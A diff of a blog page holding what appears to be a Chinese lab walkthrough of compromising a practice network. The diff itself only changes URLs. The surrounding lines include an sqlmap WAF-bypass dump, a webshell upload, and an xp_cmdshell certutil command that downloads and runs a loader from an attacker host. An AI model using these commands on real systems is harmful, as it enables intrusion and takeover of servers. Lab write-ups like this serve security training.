@@ -4,7 +4,7 @@
 <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no"><title>记一次和室友曲折的靶场实战 - Theoyu</title>
 
 <meta name="description" content="">
-<link rel="canonical" href="http://localhost:4000/2022/ack123"><link rel="alternate" type="application/rss+xml" title="Theoyu" href="/feed.xml"><!-- start favicons snippet, use https://realfavicongenerator.net/ --><link rel="apple-touch-icon" sizes="180x180" href="/assets/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/favicon-16x16.png"><link rel="manifest" href="/assets/site.webmanifest"><link rel="mask-icon" href="/assets/safari-pinned-tab.svg" color="#fc4d50"><link rel="shortcut icon" href="/assets/favicon.ico">
+<link rel="canonical" href="https://theoyu.top/2022/ack123"><link rel="alternate" type="application/rss+xml" title="Theoyu" href="/feed.xml"><!-- start favicons snippet, use https://realfavicongenerator.net/ --><link rel="apple-touch-icon" sizes="180x180" href="/assets/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/favicon-16x16.png"><link rel="manifest" href="/assets/site.webmanifest"><link rel="mask-icon" href="/assets/safari-pinned-tab.svg" color="#fc4d50"><link rel="shortcut icon" href="/assets/favicon.ico">
 
 <meta name="msapplication-TileColor" content="#ffc40d"><meta name="msapplication-config" content="/assets/browserconfig.xml">
 
@@ -613,11 +613,11 @@ LTEyVDE0OjIwOjU5KzAwOjAw/4GGiQAAAABJRU5ErkJggg==" />
 
 <p>发现我还在配域环境的时候，马哥已经拿到了一个xss…</p>
 
-<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/03/20220330105741.png" alt="image-20220330090254442" /></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/03/20220330105741.png" alt="image-20220330090254442" /></p>
 
 <p>目录扫描，扫到了<code class="language-plaintext highlighter-rouge">/login</code>路由，登录显示存在admin用户，随意创建一个用户进后台发现可以是可以直接修改前台模版(html)，但是进一步操作需要管理员权限。</p>
 
-<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/03/20220330105748.png" alt="image-20220330090936005" /></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/03/20220330105748.png" alt="image-20220330090936005" /></p>
 
 <p>查看网站配置，发现使用了MSSQL和百度Ueditor，隐隐约约记得1.4.3这个版本是有洞的，不过上网查了一下漏洞利用需要一个富文本编辑器的接口，普通用户是看不到的。</p>
 
@@ -625,27 +625,27 @@ LTEyVDE0OjIwOjU5KzAwOjAw/4GGiQAAAABJRU5ErkJggg==" />
 
 <p>网站首页查询界面存在sql注入</p>
 
-<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/03/20220330105751.png" alt="image-20220324170705114" /></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/03/20220330105751.png" alt="image-20220324170705114" /></p>
 
 <p>不过发现注入速度非常慢，大概10多秒钟才能回显一个字母。</p>
 
 <p>一般这种xxxcms的建站，在网上都可以搜到相关源码，而数据库相关信息都是写死在源码中的，我们需要拿到管理员密码，那么只需要找到密码在数据库中所在的表和列即可。</p>
 
-<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/03/20220330105754.png" alt="image-20220330090053912" /></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/03/20220330105754.png" alt="image-20220330090053912" /></p>
 
 <p>在源码的<code class="language-plaintext highlighter-rouge">HdhApp.cinfig</code>中找到了数据库文件<code class="language-plaintext highlighter-rouge">HdbCms.mdb</code>，可用微软自带的Access打开：</p>
 
-<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/03/20220330105757.png" alt="image-20220330090117660" /></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/03/20220330105757.png" alt="image-20220330090117660" /></p>
 
 <p>经测试网站存在WAF，不过可用大小写绕过，这里选择sqlmap的<code class="language-plaintext highlighter-rouge">randomcase</code>模式：</p>
 
 <p><code class="language-plaintext highlighter-rouge">python3 sqlmap.py -r "~/sql.txt" -p DonforGjc -D "DemoHdhCms" -T "Onkey_DonforGlcy" -C "pwd" --tamper=randomcase --dump </code></p>
 
-<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/03/20220330105759.png" alt="image-20220324174403445" /></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/03/20220330105759.png" alt="image-20220324174403445" /></p>
 
 <p>拿到了管理员密码，不过我继续看了一下源码，抱着好奇的心态全局搜索了一下<code class="language-plaintext highlighter-rouge">UEditor</code>，居然搜到了其对应的借口，用<code class="language-plaintext highlighter-rouge">admin,password-moon</code>登录上去确实的确是这个。</p>
 
-<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/03/20220330105802.png" alt="image-20220330090143924" /></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/03/20220330105802.png" alt="image-20220330090143924" /></p>
 
 <p>麻了感觉白注入，不过关系不大，那就直接打<code class="language-plaintext highlighter-rouge">UEditor</code>吧。</p>
 
@@ -660,11 +660,11 @@ LTEyVDE0OjIwOjU5KzAwOjAw/4GGiQAAAABJRU5ErkJggg==" />
 
 <p>浏览器打开后输入<code class="language-plaintext highlighter-rouge">http://your_ip/theoyu.jpg?.aspx</code>，利用解析漏洞上传上去(被保存为了aspx文件)</p>
 
-<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/03/20220330105806.png" alt="image-20220324184727113" /></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/03/20220330105806.png" alt="image-20220324184727113" /></p>
 
 <p>webshell上线之后，蚁剑连接，看看杀软：</p>
 
-<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/03/20220330105811.png" alt="image-20220325141017282" /></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/03/20220330105811.png" alt="image-20220325141017282" /></p>
 
 <table>
   <thead>
@@ -693,7 +693,7 @@ LTEyVDE0OjIwOjU5KzAwOjAw/4GGiQAAAABJRU5ErkJggg==" />
 
 <p>想起来之前下载源码的 <strong>HdhApp.config</strong> 文件是会记录数据库机器的信息的，留意了一下再看看：</p>
 
-<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/03/20220330105815.png" alt="image-20220325100258375" /></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/03/20220330105815.png" alt="image-20220325100258375" /></p>
 
 <p>发现<code class="language-plaintext highlighter-rouge">source</code>指向并非官方源码上的localhost，而是22网段的一个ip，怀疑存在站库分离。</p>
 
@@ -701,7 +701,7 @@ LTEyVDE0OjIwOjU5KzAwOjAw/4GGiQAAAABJRU5ErkJggg==" />
 
 <p>信息收集了一下也的确存在22网段和这个ip，mssql默认端口号为1433，这里我使用哥斯拉自带数据库管理进行连接。</p>
 
-<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/03/20220330105818.png" alt="image-20220325141502201" /></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/03/20220330105818.png" alt="image-20220325141502201" /></p>
 
 <p>连上之后，可以命令执行，但是很不方便(回显都在一张表里..)，whoami看到还是一个很低的权限用户，需要cs或者msf后渗透才行。</p>
 
@@ -761,21 +761,21 @@ msf6 exploit<span class="o">(</span>windows/local/payload_inject<span class="o">
 
 <p>cs接收后，是用烂土豆可以直接提权到System。（马哥放弃了免杀，选择加入）</p>
 
-<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/03/20220330105822.png" alt="image-20220325160102079" /></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/03/20220330105822.png" alt="image-20220325160102079" /></p>
 
 <p>本来打算用cs自带的代理，用proxychain配合<a href="https://github.com/SafeGroceryStore/MDUT">MDUT</a>直接打数据库，但是m1的proxychain配了一下午也没配好，蚌埠住了，直接上网找了个自带数据库管理的大马。<del>上面纯纯白忙活。</del>（其实也不算白忙活，在exe被直接杀的情况下，也的确可以用这种方式回弹cs）</p>
 
 <p>命令执行后，查一下进程，有火绒。</p>
 
-<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/03/20220330105828.png" alt="image-20220326104435675" /></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/03/20220330105828.png" alt="image-20220326104435675" /></p>
 
-<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/03/20220330105835.png" alt="image-20220326011713900" /></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/03/20220330105835.png" alt="image-20220326011713900" /></p>
 
 <p>回到web1，之前马哥在web1被360杀疯了，在他的请求下我看了眼虚拟机是啥情况：</p>
 
-<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/03/20220330105832.jpg" alt="E3B51E067B2366D67635BC9838C3B0C2" /></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/03/20220330105832.jpg" alt="E3B51E067B2366D67635BC9838C3B0C2" /></p>
 
-<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/03/20220330105839.jpg" alt="40C990A590B7A5066AF38F27984D7FCC" /></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/03/20220330105839.jpg" alt="40C990A590B7A5066AF38F27984D7FCC" /></p>
 
 <p>我理解这是两类防御，第一种是木马查杀，也就是直接传可执行文件，没做免杀或者免杀力度不够上来就没了。第二类是加载器+注入内存，不过此类可能会被入侵检测检测到。</p>
 
@@ -784,9 +784,9 @@ msf6 exploit<span class="o">(</span>windows/local/payload_inject<span class="o">
 <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Exec master.dbo.xp_cmdshell ' certutil –urlcache –f –split http://your ip/HanzoInjection.exe C:\Windows\Temp\loader.exe'
 </code></pre></div></div>
 
-<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/03/20220330105959.png" alt="image-20220326114039661" /></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/03/20220330105959.png" alt="image-20220326114039661" /></p>
 
-<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/03/20220330105846.png" alt="image-20220326113519456" /></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/03/20220330105846.png" alt="image-20220326113519456" /></p>
 
 <p>发现vps收到了访问请求，但是并没能下载成功，查了一下是火绒对本地<code class="language-plaintext highlighter-rouge">certutil</code>有所限制，可以 把system32下的<code class="language-plaintext highlighter-rouge">certutil</code>移位置重命名绕过检测。</p>
 
@@ -806,7 +806,7 @@ Exec master.dbo.xp_cmdshell 'cd C:\Users\MSSQLSERVER\ &amp;&amp; loader.exe -e c
 
 <p>cs接收后，同web1烂土豆提权。</p>
 
-<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/03/20220330105849.png" alt="image-20220326125847785" /></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/03/20220330105849.png" alt="image-20220326125847785" /></p>
 
 <p>信息收集，马哥发现22网段下135存活，建立cs自带的socks代理，马哥继续nmap扫描</p>
 
@@ -840,45 +840,45 @@ Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft
 
 <p>192.168.22.135的80端口开启了Apache服务，通过代理访问，是一个 <strong>演示：J WT实战：使用axios+PHP</strong> 实现登录认证页面，用给的demo账号登录没有反应，这里马哥去爆破jwt密钥了。</p>
 
-<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/03/20220330105853.png" alt="image-20220326141009298" /></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/03/20220330105853.png" alt="image-20220326141009298" /></p>
 
 <p>继续信息收集，扫到目录下<code class="language-plaintext highlighter-rouge">a.php</code>，前面是一堆sql日志信息，后面打印了<code class="language-plaintext highlighter-rouge">phpinfo</code></p>
 
-<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/03/20220330110009.png" alt="image-20220326162954201" /></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/03/20220330110009.png" alt="image-20220326162954201" /></p>
 
 <p>发现<code class="language-plaintext highlighter-rouge">PHP_SESSION_UPLOAD_PROGRESS</code>是开启的，那么如果存在文件包含是可能可以直接LFI Getshell(说是有可能是因为用代理打的话，不太稳定)。</p>
 
 <p>但是走到<code class="language-plaintext highlighter-rouge">a.php</code>最后，我直接蚌埠住了，什么意思？</p>
 
-<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/03/20220330105859.png" alt="image-20220326162254713" /></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/03/20220330105859.png" alt="image-20220326162254713" /></p>
 
 <p>这不就是典型的一句话木马没传参数的报错嘛，给蚁剑设上代理，连接试试</p>
 
-<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/03/20220330105902.png" alt="image-20220326162618818" /></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/03/20220330105902.png" alt="image-20220326162618818" /></p>
 
 <p>成功了，有点没弄懂，那jwt页面岂不是完全唬人嘛，马哥的爆破也白弄了，不过如果是真实环境下，倒是也都有可能，前进都是在不断试错的基础上迈步。</p>
 
 <p>蚁剑连上去，发现<code class="language-plaintext highlighter-rouge">phpmyadmin</code>，以及几个文件的创建时间，结合之前<code class="language-plaintext highlighter-rouge">a.php</code>上sql日志信息，大概明白应该是利用jwt爆破的密钥登录phpmyadmin，再利用日志文件getshell。</p>
 
-<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/03/20220330105905.png" alt="image-20220326164915760" /></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/03/20220330105905.png" alt="image-20220326164915760" /></p>
 
 <p>马哥jwt也爆破出来了</p>
 
-<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/03/20220330110028.png" alt="image-20220326163351362" /></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/03/20220330110028.png" alt="image-20220326163351362" /></p>
 
 <p>简单测试了一下，用root Qweasdzxc5 登录phpmyadmin成功 ，之后就是很简单的日志写马，就不演示了。</p>
 
 <p>但是Web2并不出网，这里我们通过Web1做跳板机代理出来。</p>
 
-<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/03/20220330105909.png" alt="image-20220326175722454" /></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/03/20220330105909.png" alt="image-20220326175722454" /></p>
 
 <p>payload生成选择<strong>Windows Excutable(s)</strong>，再用蚁剑上传上去，执行拿到权限。</p>
 
-<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/03/20220330105912.png" alt="image-20220326180431551" /></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/03/20220330105912.png" alt="image-20220326180431551" /></p>
 
 <p>但是session极其不稳定，平均一分钟一跳，很难受：</p>
 
-<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/03/20220330110043.png" alt="image-20220326182548376" /></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/03/20220330110043.png" alt="image-20220326182548376" /></p>
 
 <p>看网上说用ew做跳板工具会比cs自带的转发稳定一些，不过在web1基本上上去就被杀了。之前Kcon关注到<a href="https://github.com/ph4ntonn/Stowaway">Stowaway</a>这个项目还不错，有机会可以学习一下。</p>
 
@@ -886,19 +886,19 @@ Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft
 
 <p>发现Web2在域内，看一下域内机器：</p>
 
-<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/03/20220330105916.png" alt="image-20220326195802401" /></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/03/20220330105916.png" alt="image-20220326195802401" /></p>
 
 <p>出去上了个课，回来马哥已经拿下了域控(别骂了别骂了有机会我补上)，这里我横向建立 SMB Beacon，域内就可以批量上线了～</p>
 
-<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/03/20220330105919.png" alt="image-20220329003822748" /></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/03/20220330105919.png" alt="image-20220329003822748" /></p>
 
-<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/03/20220330105922.png" alt="image-20220329004044722" /></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/03/20220330105922.png" alt="image-20220329004044722" /></p>
 
-<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/03/20220330105926.png" alt="image-20220329003540577" /></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/03/20220330105926.png" alt="image-20220329003540577" /></p>
 
 <p>最后：</p>
 
-<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/03/20220330105930.png" alt="image-20220329003649048" /></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/03/20220330105930.png" alt="image-20220329003649048" /></p>
 
 <p>总结</p>
 
@@ -954,7 +954,7 @@ Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft
   *  RECOMMENDED CONFIGURATION VARIABLES: EDIT AND UNCOMMENT THE SECTION BELOW TO INSERT DYNAMIC VALUES FROM YOUR PLATFORM OR CMS.
   *  LEARN WHY DEFINING THESE VARIABLES IS IMPORTANT: https://disqus.com/admin/universalcode/#configuration-variables*/
   var disqus_config = function () {
-    this.page.url = 'http://localhost:4000/2022/ack123';
+    this.page.url = 'https://theoyu.top/2022/ack123';
     this.page.identifier = 'ack123';
   };
   (function() { // DON'T EDIT BELOW THIS LINE
